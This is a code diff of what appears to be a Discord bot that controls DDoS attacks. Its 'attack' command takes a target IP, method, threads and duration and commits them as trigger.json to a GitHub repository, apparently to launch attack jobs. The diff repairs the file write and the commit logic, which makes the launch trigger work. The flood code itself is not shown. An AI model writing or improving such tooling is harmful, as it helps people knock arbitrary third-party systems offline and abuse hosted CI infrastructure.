@@ -59,34 +59,35 @@ async def attack(interaction: discord.Interaction, target_ip: str, method: app_c
         "timestamp": str(datetime.utcnow())
     }
 
-    with open(CONFIG_FILE, "r") as f:
-        content = f.read()
+    with open(CONFIG_FILE, "w") as f:
+        json.dump(config, f, indent=2)
 
-        try:
-            g = Github(GITHUB_TOKEN)
-            repo = g.get_repo(REPO_NAME)
-            with open(CONFIG_FILE, "r") as f:
+    try:
+        g = Github(GITHUB_TOKEN)
+        repo = g.get_repo(REPO_NAME)
+
+        with open(CONFIG_FILE, "r") as f:
             content = f.read()
 
-            try:
-                contents = repo.get_contents("trigger.json", ref=BRANCH)
-                repo.update_file(
-                    path=contents.path,
-                    message="Update trigger.json",
+        try:
+            contents = repo.get_contents("trigger.json", ref=BRANCH)
+            repo.update_file(
+                path=contents.path,
+                message="Update trigger.json",
+                content=content,
+                sha=contents.sha,
+                branch=BRANCH
+            )
+        except Exception as inner:
+            if "404" in str(inner):
+                repo.create_file(
+                    path="trigger.json",
+                    message="Create trigger.json",
                     content=content,
-                    sha=contents.sha,
                     branch=BRANCH
                 )
-            except Exception as inner:
-                if "404" in str(inner):
-                    repo.create_file(
-                        path="trigger.json",
-                        message="Create trigger.json",
-                        content=content,
-                        branch=BRANCH
-                    )
-                else:
-                    raise inner
+            else:
+                raise inner
 
         await interaction.response.send_message(
             f"✅ Target: `{target_ip}` | Method: `{method.value}` | Threads: `{threads}` | Duration: `{duration}`s"
